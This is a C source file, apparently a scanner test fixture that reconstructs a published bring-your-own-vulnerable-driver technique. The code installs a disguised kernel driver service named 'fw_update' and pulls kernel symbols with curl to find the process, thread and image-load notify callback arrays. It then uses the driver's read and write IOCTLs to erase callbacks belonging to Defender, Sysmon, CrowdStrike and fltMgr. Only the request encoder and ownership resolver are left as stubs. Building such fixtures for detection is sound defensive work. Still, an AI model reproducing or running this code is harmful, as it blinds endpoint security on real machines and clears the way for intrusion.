/* Representative reconstruction of the published symbol-guided BYOVD flow.
   The request encoder and ownership resolver are harness interfaces: the report
   does not publish their layouts. This fixture is for static scanning only. */
#include <windows.h>
#include <dbghelp.h>
#include <stdint.h>
extern void encode_request(void *, uintptr_t, uintptr_t, size_t);
extern int security_module_owns(uintptr_t, const char **);
void blind_callbacks(uintptr_t kernel_base, const char *build_guid, DWORD read_ioctl, DWORD write_ioctl) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE svc = CreateServiceA(scm, "fw_update", "fw_update",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, "C:\\Windows\\Temp\\firmware.sys",
        NULL, NULL, NULL, NULL, NULL);
    StartServiceA(svc, 0, NULL);
    HANDLE device = CreateFileA("\\\\.\\CallbackDevice", GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    char command[1024];
    wsprintfA(command, "curl.exe -o ntkrnlmp.pdb https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/%s/ntkrnlmp.pdb", build_guid);
    WinExec(command, SW_HIDE);
    HANDLE process = GetCurrentProcess();
    SymInitialize(process, NULL, FALSE);
    DWORD64 image = SymLoadModuleEx(process, NULL, "ntkrnlmp.pdb", NULL, kernel_base, 0, NULL, 0);
    const char *arrays[] = {"PspCreateProcessNotifyRoutine", "PspCreateThreadNotifyRoutine", "PspLoadImageNotifyRoutine"};
    const char *targets[] = {"WdFilter.sys", "SysmonDrv.sys", "csagent.sys", "fltMgr.sys", NULL};
    for (int a = 0; a < 3; a++) {
        char storage[sizeof(SYMBOL_INFO) + MAX_SYM_NAME];
        SYMBOL_INFO *symbol = (SYMBOL_INFO *)storage;
        symbol->SizeOfStruct = sizeof(SYMBOL_INFO);
        symbol->MaxNameLen = MAX_SYM_NAME;
        if (!SymFromName(process, arrays[a], symbol)) continue;
        ULONG type_length;
        SymGetTypeInfo(process, image, symbol->TypeIndex, TI_GET_LENGTH, &type_length);
        for (int i = 0; i < 64; i++) {
            uintptr_t entry = symbol->Address + i * sizeof(uintptr_t);
            uintptr_t callback = 0, zero = 0;
            unsigned char request[64]; DWORD returned;
            encode_request(request, entry, (uintptr_t)&callback, sizeof(callback));
            DeviceIoControl(device, read_ioctl, request, sizeof(request), &callback, sizeof(callback), &returned, NULL);
            if (callback && security_module_owns(callback, targets)) {
                encode_request(request, (uintptr_t)&zero, entry, sizeof(zero));
                DeviceIoControl(device, write_ioctl, request, sizeof(request), NULL, 0, &returned, NULL);
            }
        }
    }
    CloseHandle(device);
    SymCleanup(process);
}
